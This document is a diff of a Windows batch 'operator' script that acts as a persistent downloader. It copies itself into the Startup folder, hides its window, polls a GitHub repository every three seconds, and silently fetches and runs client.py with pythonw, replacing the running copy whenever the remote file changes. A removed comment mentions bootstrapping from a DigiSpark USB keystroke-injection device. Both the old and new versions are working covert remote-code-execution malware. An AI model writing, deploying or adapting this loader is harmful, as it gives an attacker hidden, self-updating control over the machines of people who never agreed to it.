@@ -1,267 +1,203 @@
 @echo off
 setlocal enabledelayedexpansion
 
-rem Operator: ensure client.py exists and is running; poll every 3s for updates; replace on change
-rem Includes:
-rem - Robust python detection (pythonw/python/py -3.11)
-rem - Force-start immediately after first download
-rem - Custom command variables so you can specify exactly how to run client.py
+:: Configuration
+set "GITHUB_USER=sky9262"
+set "GITHUB_REPO=abc"
+set "GITHUB_BRANCH=main"
+set "GITHUB_FILE=client.py"
+set "GITHUB_URL=https://github.com/%GITHUB_USER%/%GITHUB_REPO%/raw/refs/heads/%GITHUB_BRANCH%/%GITHUB_FILE%"
+set "GITHUB_API_URL=https://api.github.com/repos/%GITHUB_USER%/%GITHUB_REPO%/commits/%GITHUB_BRANCH%"
+set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "CLIENT_FILE=%STARTUP_DIR%\client.py"
+set "TEMP_FILE=%TEMP%\client_temp.py"
+set "LOG_FILE=%STARTUP_DIR%\client.log"
+set "COMMIT_FILE=%STARTUP_DIR%\last_commit.txt"
+set "CHECK_INTERVAL=3"
 
-set "url=https://raw.githubusercontent.com/sky9262/abc/main/client.py"
-set "base=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "target=%base%\client.py"
-set "pidfile=%base%\client.pid"
-set "log=%base%\operator.log"
+:: Create log function
+call :LOG "=== Starting Enhanced Operator - Commit-Based Update Detection ==="
+call :LOG "GitHub User/Repo: %GITHUB_USER%/%GITHUB_REPO%"
+call :LOG "Branch: %GITHUB_BRANCH%"
+call :LOG "File: %GITHUB_FILE%"
+call :LOG "GitHub API URL: %GITHUB_API_URL%"
+call :LOG "Check Interval: %CHECK_INTERVAL% seconds"
 
-rem ===== Custom command configuration (choose ONE) =====
-rem 1) COMMAND: full command string executed in Startup folder, e.g.:
-rem    set "COMMAND=py -3.11 client.py"
-rem 2) LAUNCH_CMD_FULL: full command string (similar to COMMAND). You can use "%target%" or "client.py", e.g.:
-rem    set "LAUNCH_CMD_FULL=py -3.11 ""%target%"""
-rem 3) LAUNCH_CMD: prefix only; the script appends the quoted client path, e.g.:
-rem    set "LAUNCH_CMD=py -3.11"
-set "COMMAND=py -3.11 client.py"
-set "LAUNCH_CMD_FULL="
-set "LAUNCH_CMD=python"
-rem =====================================================
-
-if not exist "%base%" mkdir "%base%" >nul 2>&1
-
-rem Self-install to Startup if running from elsewhere (supports DigiSpark temp bootstrap)
-set "SELF=%~f0"
-set "OP_PATH=%base%\operator.bat"
-if /I not "%SELF%"=="%OP_PATH%" (
-  copy /y "%SELF%" "%OP_PATH%" >nul 2>&1
-  start "" "%OP_PATH%"
-  exit /b
+:: Hide console window
+if "%1" neq "hidden" (
+    call :LOG "Hiding console window and restarting in background..."
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
+    exit /b
 )
 
-:mainloop
-rem ========== Loop start ==========
-echo [%date% %time%] Loop start >> "%log%"
+:MAIN_LOOP
+call :LOG "--- Starting check cycle ---"
 
-rem 1) Ensure client.py exists (download if missing)
-if not exist "%target%" (
-  echo [%date% %time%] client.py missing; downloading from %url% >> "%log%"
-  powershell -NoProfile -WindowStyle Hidden -Command "$u='%url%'; try{ [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u=$u+'?t='+[guid]::NewGuid().ToString('N'); Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile '%target%' -ErrorAction Stop }catch{}" >nul 2>&1
-  if exist "%target%" (
-    echo [%date% %time%] Downloaded client.py to "%target%" >> "%log%"
-    rem Force a start immediately after first download (bypass detection edge-cases)
-    call :try_start
-  ) else (
-    echo [%date% %time%] Download attempt failed (file still missing) >> "%log%"
-  )
+:: Check if startup directory exists, create if not
+if not exist "%STARTUP_DIR%" (
+    call :LOG "Creating startup directory: %STARTUP_DIR%"
+    mkdir "%STARTUP_DIR%"
 )
 
-rem 2) Ensure client.py is running (by command-line match)
-set "RUNNING=0"
-powershell -NoProfile -WindowStyle Hidden -Command "$t=[regex]::Escape($env:target); $r=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match $t } | Select-Object -First 1; if($r){exit 0}else{exit 1}" >nul 2>&1
-if not errorlevel 1 set "RUNNING=1"
+:: Get latest commit SHA from GitHub API
+call :LOG "Fetching latest commit SHA from GitHub API..."
+powershell -WindowStyle Hidden -Command ^
+  "try { $response = Invoke-RestMethod -Uri '%GITHUB_API_URL%' -Headers @{'User-Agent'='Operator-Bot'} -TimeoutSec 10; $response.sha | Out-File -FilePath '%TEMP%\latest_commit.txt' -Encoding UTF8 -NoNewline; Write-Host 'Success: Latest commit fetched' } catch { Write-Host 'Error:' $_.Exception.Message; exit 1 }"
 
-if "%RUNNING%"=="1" (
-  echo [%date% %time%] client.py already running >> "%log%"
+if %ERRORLEVEL% neq 0 (
+    call :LOG "ERROR: Failed to fetch commit SHA from GitHub API, retrying in %CHECK_INTERVAL% seconds..."
+    goto WAIT_AND_LOOP
+)
+
+:: Read latest commit SHA
+set "latest_commit="
+if exist "%TEMP%\latest_commit.txt" (
+    for /f "usebackq delims=" %%i in ("%TEMP%\latest_commit.txt") do set "latest_commit=%%i"
+    del "%TEMP%\latest_commit.txt" 2>nul
+)
+
+if "!latest_commit!"=="" (
+    call :LOG "ERROR: Could not read commit SHA"
+    goto WAIT_AND_LOOP
+)
+
+call :LOG "Latest GitHub commit: !latest_commit!"
+
+:: Read stored commit SHA
+set "stored_commit="
+if exist "%COMMIT_FILE%" (
+    for /f "usebackq delims=" %%i in ("%COMMIT_FILE%") do set "stored_commit=%%i"
+    call :LOG "Stored commit: !stored_commit!"
 ) else (
-  echo [%date% %time%] client.py not running; attempting start >> "%log%"
-  call :try_start
-
-  rem Verify running after attempts
-  set "RUNNING=0"
-  powershell -NoProfile -WindowStyle Hidden -Command "$t=[regex]::Escape($env:target); $r=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match $t } | Select-Object -First 1; if($r){exit 0}else{exit 1}" >nul 2>&1
-  if not errorlevel 1 set "RUNNING=1"
-
-  if "%RUNNING%"=="1" (
-    echo [%date% %time%] Confirmed client.py is running >> "%log%"
-  ) else (
-    echo [%date% %time%] ERROR: Failed to start client.py by all methods >> "%log%"
-  )
+    call :LOG "No stored commit found - first run"
 )
 
-rem 3) Poll for new version and compare against current (update flow)
-set "temp=%TEMP%\client_new_%RANDOM%.py"
-powershell -NoProfile -WindowStyle Hidden -Command "$u='%url%'; try{ [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u=$u+'?t='+[guid]::NewGuid().ToString('N'); Invoke-WebRequest -UseBasicParsing -Uri $u -OutFile '%temp%' -ErrorAction Stop }catch{}" >nul 2>&1
-
-if exist "%temp%" (
-  set "DIFF=0"
-  if exist "%target%" (
-    powershell -NoProfile -Command "$h1=(Get-FileHash -Algorithm SHA256 -Path '%temp%').Hash; $h2=(Get-FileHash -Algorithm SHA256 -Path '%target%').Hash; if($h1 -ne $h2){exit 1}else{exit 0}" >nul 2>&1
-    if errorlevel 1 set "DIFF=1"
-  ) else (
-    set "DIFF=1"
-  )
-
-  if "!DIFF!"=="1" (
-    echo [%date% %time%] Update detected; replacing client.py and restarting >> "%log%"
-
-    rem 3a) Stop current client
-    if exist "%pidfile%" (
-      for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-      if defined CPID powershell -NoProfile -WindowStyle Hidden -Command "try{Stop-Process -Id $env:CPID -Force -ErrorAction SilentlyContinue}catch{}" >nul 2>&1
-      del /f /q "%pidfile%" >nul 2>&1
-      echo [%date% %time%] Stopped PID %CPID% and cleared pidfile >> "%log%"
-    )
-    powershell -NoProfile -WindowStyle Hidden -Command "Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }" >nul 2>&1
-
-    rem 3b) Replace current file with new
-    del /f /q "%target%" >nul 2>&1
-    move /y "%temp%" "%target%" >nul 2>&1
-    echo [%date% %time%] Replaced client.py with new version >> "%log%"
-
-    rem 3c) Jump to start to re-ensure presence and process start
-    timeout /t 1 /nobreak >nul 2>&1
-    goto mainloop
-  ) else (
-    del /f /q "%temp%" >nul 2>&1
-  )
+:: Check if client.py exists
+if not exist "%CLIENT_FILE%" (
+    call :LOG "Client.py not found - downloading..."
+    goto DOWNLOAD_AND_UPDATE
 )
 
-rem 4) Wait 3 seconds and repeat (continuous monitoring)
+:: Check if we have a new commit
+if "!stored_commit!" neq "!latest_commit!" (
+    call :LOG "NEW COMMIT DETECTED - Update needed!"
+    call :LOG "Old: !stored_commit!"
+    call :LOG "New: !latest_commit!"
+    goto UPDATE_CLIENT
+) else (
+    call :LOG "No new commits - checking if client is running..."
+)
+
+:: Check if client.py is running (improved detection)
+call :LOG "Checking if client.py is running..."
+set "client_running=0"
+
+powershell -WindowStyle Hidden -Command ^
+  "Get-CimInstance Win32_Process | Where-Object { ($_.Name -eq 'python.exe' -or $_.Name -eq 'pythonw.exe') -and $_.CommandLine -like '*client.py*' } | ForEach-Object { Write-Host 'Found PID:' $_.ProcessId '; CMD:' $_.CommandLine; exit 0 }; exit 1"
+
+if %ERRORLEVEL% equ 0 (
+    call :LOG "Client.py IS running"
+    set "client_running=1"
+) else (
+    call :LOG "Client.py is NOT running - will start it"
+    goto START_CLIENT
+)
+
+goto WAIT_AND_LOOP
+
+:DOWNLOAD_AND_UPDATE
+call :LOG "=== DOWNLOADING CLIENT ==="
+powershell -WindowStyle Hidden -Command ^
+  "try { $timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); $url = '%GITHUB_URL%' + '?t=' + $timestamp; Invoke-WebRequest -Uri $url -OutFile '%CLIENT_FILE%' -UseBasicParsing -Headers @{'Cache-Control'='no-cache'} -TimeoutSec 15; Write-Host 'Download successful' } catch { Write-Host 'Download failed:' $_.Exception.Message; exit 1 }"
+
+if %ERRORLEVEL% neq 0 (
+    call :LOG "ERROR: Failed to download client.py"
+    goto WAIT_AND_LOOP
+) else (
+    call :LOG "Successfully downloaded client.py"
+)
+
+:: Store the new commit SHA
+echo !latest_commit!>"%COMMIT_FILE%"
+call :LOG "Stored new commit SHA: !latest_commit!"
+goto START_CLIENT
+
+:UPDATE_CLIENT
+call :LOG "=== UPDATING CLIENT ==="
+
+:: Kill existing client processes (more aggressive)
+call :LOG "Stopping all client processes..."
+powershell -WindowStyle Hidden -Command ^
+  "Get-CimInstance Win32_Process | Where-Object { ($_.Name -eq 'python.exe' -or $_.Name -eq 'pythonw.exe') -and $_.CommandLine -like '*client.py*' } | ForEach-Object { try { Write-Host 'Killing PID:' $_.ProcessId; Stop-Process -Id $_.ProcessId -Force } catch {} }"
+
+:: Wait for processes to terminate
 timeout /t 3 /nobreak >nul 2>&1
-goto mainloop
 
-rem ===== Subroutines =====
-:try_start
-set "STARTED=0"
+:: Force delete old client
+call :LOG "Removing old client.py..."
+if exist "%CLIENT_FILE%" (
+    attrib -r -h -s "%CLIENT_FILE%" 2>nul
+    del /f /q "%CLIENT_FILE%" 2>nul
+)
 
-rem Attempt 0A: Custom COMMAND (full string)
-if "%STARTED%"=="0" (
-  if defined COMMAND (
-    echo [%date% %time%] Attempt: Custom COMMAND => %COMMAND% >> "%log%"
-    powershell -NoProfile -WindowStyle Hidden -Command "$cmd=$env:COMMAND; if([string]::IsNullOrWhiteSpace($cmd)){exit 1}; try{ Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c',$cmd) -WorkingDirectory $env:base -WindowStyle Hidden | Out-Null }catch{}; Start-Sleep -Milliseconds 800; $p=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | Select-Object -ExpandProperty ProcessId -First 1; if($p){ Set-Content -Path $env:pidfile -Value $p; exit 0 } else { exit 1 }" >nul 2>&1
-    if not errorlevel 1 (
-      set "STARTED=1"
-      set "CPID="
-      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-      echo [%date% %time%] Started via custom COMMAND PID=!CPID! >> "%log%"
-    ) else (
-      echo [%date% %time%] Custom COMMAND failed >> "%log%"
+:: Download new version
+call :LOG "Downloading updated client.py..."
+powershell -WindowStyle Hidden -Command ^
+  "try { $timestamp = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); $url = '%GITHUB_URL%' + '?t=' + $timestamp; Invoke-WebRequest -Uri $url -OutFile '%CLIENT_FILE%' -UseBasicParsing -Headers @{'Cache-Control'='no-cache'} -TimeoutSec 15; Write-Host 'Download successful' } catch { Write-Host 'Download failed:' $_.Exception.Message; exit 1 }"
+
+if %ERRORLEVEL% neq 0 (
+    call :LOG "ERROR: Failed to download updated client.py"
+    goto WAIT_AND_LOOP
+)
+
+:: Store the new commit SHA
+echo !latest_commit!>"%COMMIT_FILE%"
+call :LOG "Updated to commit: !latest_commit!"
+goto START_CLIENT
+
+:START_CLIENT
+call :LOG "=== STARTING CLIENT ==="
+cd /d "%STARTUP_DIR%"
+
+:: Try to run client and capture any immediate errors
+call :LOG "Starting client.py with error logging..."
+start /B "" cmd /c "pythonw.exe "%CLIENT_FILE%" 2>"%STARTUP_DIR%\client_error.log""
+if %ERRORLEVEL% neq 0 (
+    call :LOG "Failed with pythonw, trying python.exe..."
+    start /B "" cmd /c "python.exe "%CLIENT_FILE%" 2>"%STARTUP_DIR%\client_error.log""
+    if !ERRORLEVEL! neq 0 (
+        call :LOG "ERROR: Failed to start client.py"
+        goto WAIT_AND_LOOP
     )
-  )
 )
 
-rem Attempt 0B: Custom LAUNCH_CMD_FULL (full string)
-if "%STARTED%"=="0" (
-  if defined LAUNCH_CMD_FULL (
-    echo [%date% %time%] Attempt: Custom LAUNCH_CMD_FULL => %LAUNCH_CMD_FULL% >> "%log%"
-    powershell -NoProfile -WindowStyle Hidden -Command "$cmd=$env:LAUNCH_CMD_FULL; if([string]::IsNullOrWhiteSpace($cmd)){exit 1}; try{ Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c',$cmd) -WorkingDirectory $env:base -WindowStyle Hidden | Out-Null }catch{}; Start-Sleep -Milliseconds 800; $p=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | Select-Object -ExpandProperty ProcessId -First 1; if($p){ Set-Content -Path $env:pidfile -Value $p; exit 0 } else { exit 1 }" >nul 2>&1
-    if not errorlevel 1 (
-      set "STARTED=1"
-      set "CPID="
-      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-      echo [%date% %time%] Started via LAUNCH_CMD_FULL PID=!CPID! >> "%log%"
-    ) else (
-      echo [%date% %time%] LAUNCH_CMD_FULL failed >> "%log%"
+call :LOG "Client start command executed"
+
+:: Wait and check for errors
+timeout /t 2 /nobreak >nul 2>&1
+
+if exist "%STARTUP_DIR%\client_error.log" (
+    for /f %%i in ('find /c /v "" "%STARTUP_DIR%\client_error.log" 2^>nul') do set "error_lines=%%i"
+    if !error_lines! gtr 0 (
+        call :LOG "Possible client errors detected:"
+        set "line_count=0"
+        for /f "delims=" %%i in ('type "%STARTUP_DIR%\client_error.log" 2^>nul') do (
+            if !line_count! lss 3 (
+                call :LOG "  ERROR: %%i"
+                set /a line_count+=1
+            )
+        )
     )
-  )
 )
 
-rem Attempt 0C: Custom LAUNCH_CMD (prefix only, script appends client path)
-if "%STARTED%"=="0" (
-  if defined LAUNCH_CMD (
-    echo [%date% %time%] Attempt: Custom LAUNCH_CMD + target => %LAUNCH_CMD% "client.py" >> "%log%"
-    powershell -NoProfile -WindowStyle Hidden -Command "$prefix=$env:LAUNCH_CMD; if([string]::IsNullOrWhiteSpace($prefix)){exit 1}; $cmd=$prefix + ' ""' + $env:target + '""'; try{ Start-Process -FilePath 'cmd.exe' -ArgumentList @('/c',$cmd) -WorkingDirectory $env:base -WindowStyle Hidden | Out-Null }catch{}; Start-Sleep -Milliseconds 800; $p=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | Select-Object -ExpandProperty ProcessId -First 1; if($p){ Set-Content -Path $env:pidfile -Value $p; exit 0 } else { exit 1 }" >nul 2>&1
-    if not errorlevel 1 (
-      set "STARTED=1"
-      set "CPID="
-      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-      echo [%date% %time%] Started via LAUNCH_CMD PID=!CPID! >> "%log%"
-    ) else (
-      echo [%date% %time%] LAUNCH_CMD failed >> "%log%"
-    )
-  )
-)
+call :LOG "Client startup completed"
+goto WAIT_AND_LOOP
 
-rem Attempt A: pythonw.exe
-if "%STARTED%"=="0" (
-  echo [%date% %time%] Attempt: pythonw.exe >> "%log%"
-  powershell -NoProfile -WindowStyle Hidden -Command "$exe=(Get-Command pythonw -ErrorAction SilentlyContinue).Path; if($exe){ try { $p=Start-Process -FilePath $exe -ArgumentList @($env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru } catch {}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } }; exit 1" >nul 2>&1
-  if not errorlevel 1 (
-    set "STARTED=1"
-    set "CPID="
-    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-    echo [%date% %time%] Started via pythonw.exe PID=!CPID! >> "%log%"
-  )
-)
+:WAIT_AND_LOOP
+timeout /t %CHECK_INTERVAL% /nobreak >nul 2>&1
+goto MAIN_LOOP
 
-rem Attempt B: python.exe
-if "%STARTED%"=="0" (
-  echo [%date% %time%] Attempt: python.exe >> "%log%"
-  powershell -NoProfile -WindowStyle Hidden -Command "$exe=(Get-Command python -ErrorAction SilentlyContinue).Path; if($exe){ try { $p=Start-Process -FilePath $exe -ArgumentList @($env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru } catch {}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } }; exit 1" >nul 2>&1
-  if not errorlevel 1 (
-    set "STARTED=1"
-    set "CPID="
-    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-    echo [%date% %time%] Started via python.exe PID=!CPID! >> "%log%"
-  )
-)
-
-rem Attempt C: py.exe (PATH) -3.11
-if "%STARTED%"=="0" (
-  echo [%date% %time%] Attempt: py.exe (PATH) -3.11 >> "%log%"
-  powershell -NoProfile -WindowStyle Hidden -Command "$exe=(Get-Command py -ErrorAction SilentlyContinue).Path; if($exe){ try { $p=Start-Process -FilePath $exe -ArgumentList @('-3.11',$env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru } catch {}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } }; exit 1" >nul 2>&1
-  if not errorlevel 1 (
-    set "STARTED=1"
-    set "CPID="
-    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-    echo [%date% %time%] Started via py.exe (PATH) -3.11 PID=!CPID! >> "%log%"
-  )
-)
-
-rem Attempt C2: py.exe (PATH) -3
-if "%STARTED%"=="0" (
-  echo [%date% %time%] Attempt: py.exe (PATH) -3 >> "%log%"
-  powershell -NoProfile -WindowStyle Hidden -Command "$exe=(Get-Command py -ErrorAction SilentlyContinue).Path; if($exe){ try { $p=Start-Process -FilePath $exe -ArgumentList @('-3',$env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru } catch {}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } }; exit 1" >nul 2>&1
-  if not errorlevel 1 (
-    set "STARTED=1"
-    set "CPID="
-    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-    echo [%date% %time%] Started via py.exe (PATH) PID=!CPID! >> "%log%"
-  )
-)
-
-rem Attempt D: C:\Windows\py.exe -3.11
-if "%STARTED%"=="0" (
-  echo [%date% %time%] Attempt: C:\Windows\py.exe -3.11 >> "%log%"
-  if exist "C:\Windows\py.exe" (
-    powershell -NoProfile -WindowStyle Hidden -Command "try{ $p=Start-Process -FilePath 'C:\Windows\py.exe' -ArgumentList @('-3.11',$env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru }catch{}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } else { exit 1 }" >nul 2>&1
-    if not errorlevel 1 (
-      set "STARTED=1"
-      set "CPID="
-      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-      echo [%date% %time%] Started via C:\Windows\py.exe -3.11 PID=!CPID! >> "%log%"
-    )
-  ) else (
-    echo [%date% %time%] C:\Windows\py.exe not found >> "%log%"
-  )
-)
-
-rem Attempt D2: C:\Windows\py.exe -3
-if "%STARTED%"=="0" (
-  echo [%date% %time%] Attempt: C:\Windows\py.exe -3 >> "%log%"
-  if exist "C:\Windows\py.exe" (
-    powershell -NoProfile -WindowStyle Hidden -Command "try{ $p=Start-Process -FilePath 'C:\Windows\py.exe' -ArgumentList @('-3',$env:target) -WorkingDirectory $env:base -WindowStyle Hidden -PassThru }catch{}; if($p){ Set-Content -Path $env:pidfile -Value $p.Id; exit 0 } else { exit 1 }" >nul 2>&1
-    if not errorlevel 1 (
-      set "STARTED=1"
-      set "CPID="
-      if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-      echo [%date% %time%] Started via C:\Windows\py.exe PID=!CPID! >> "%log%"
-    )
-  ) else (
-    echo [%date% %time%] C:\Windows\py.exe not found >> "%log%"
-  )
-)
-
-rem Attempt E: COM file-association fallback (hidden)
-if "%STARTED%"=="0" (
-  echo [%date% %time%] Attempt: COM WScript.Shell.Run (file association) >> "%log%"
-  powershell -NoProfile -WindowStyle Hidden -Command "$ws=$null; try{ $ws=New-Object -ComObject WScript.Shell }catch{}; if($ws){ try{ $ws.Run(('""' + $env:target + '""'),0,$false) | Out-Null }catch{}; Start-Sleep -Milliseconds 800; $p=Get-CimInstance Win32_Process | Where-Object { $_.Name -match 'python(w)?\.exe' -and $_.CommandLine -match [regex]::Escape($env:target) } | Select-Object -ExpandProperty ProcessId -First 1; if($p){ Set-Content -Path $env:pidfile -Value $p; exit 0 } else { exit 1 } } else { exit 1 }" >nul 2>&1
-  if not errorlevel 1 (
-    set "STARTED=1"
-    set "CPID="
-    if exist "%pidfile%" for /f "usebackq delims=" %%P in ("%pidfile%") do set "CPID=%%P"
-    echo [%date% %time%] Started via COM association PID=!CPID! >> "%log%"
-  ) else (
-    echo [%date% %time%] COM association fallback failed to yield process >> "%log%"
-  )
-)
-
-goto :eof
+:: Logging function
+:LOG
+echo [%date% %time%] %~1 >> "%LOG_FILE%"
+exit /b
